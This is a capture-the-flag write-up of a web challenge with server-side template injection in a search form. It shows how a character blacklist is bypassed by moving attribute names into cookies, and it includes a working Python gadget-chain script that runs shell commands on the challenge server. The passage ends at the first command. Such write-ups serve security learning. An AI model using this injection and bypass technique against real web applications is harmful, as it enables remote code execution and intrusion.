## Description

```
You have all the hints you need... Get the flag!

Flag format: CTF{sha256}
```

In the task we get a webpage with some search form.

## Task analysis

It seems the form either echos our input, or in some cases sends back some WAF-like error that certain character was blacklisted.
It took us a while to notice that there is a template injection issue.
If we send `{{3*3}}` we get back `9`.

## Template injection

Now also the whole blacklist makes sense!
We need to bypass the blacklist and get RCE.

One of more problematic blocks is `_` and also `__class__`.

But there are some tricks we can use, for example we can use `request.args` to access GET parameters, and we can use `[]` instead of `.` so for example `request[request.args.x]` would do `request.__class__` of GET parameter `x=__class__`.

It so happens that GET parameters were also subjected to blacklist.
But cookies were not!

So following the same idea, we can do `request[request.cookies['a']]`, set cookie `a=__class__` and we confirm it works.

### Gadget chain

Now we just need some decent gadget chain from `request`.
First one we found was `request._get_file_stream.im_func.func_globals['__builtins__']['__import__']`, so we can craft it:

```python
while True:
    cmd = raw_input("sh> ")
    params = {
        "content": "{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}"
    }
    cookies = {
        "a": "__class__",
        "b": "_get_file_stream",
        "c": "im_func",
        "d": "func_globals",
        "e": "__builtins__",
        "f": "__import__",
        "g": "check_output",
        "h": cmd
    }
    r = get("http://35.198.103.37:31612/", params=params, cookies=cookies)
    print(r.text)
```

And we get a nice shell.
From this we can just do `ls -la` and then `cat flag` to get:

```
sh> ls -la
